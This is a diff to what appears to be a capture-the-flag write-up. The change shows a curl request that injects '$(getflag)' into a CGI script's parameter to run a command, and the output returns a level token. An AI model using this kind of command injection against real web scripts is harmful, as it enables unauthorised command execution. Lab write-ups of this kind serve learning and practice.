@@ -51,7 +51,7 @@ This script uses CGI, which means that by connecting to the machine's IP address
 
 To get a subshell, we can send a GET request to the script with the appropriate parameters. Here is how you can do it:
 ```bash
-$ curl 'machine_ip:4747?x=$(getflag)'
+$ curl 192.168.234.77:4747?x='$(getflag)'
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
 ---
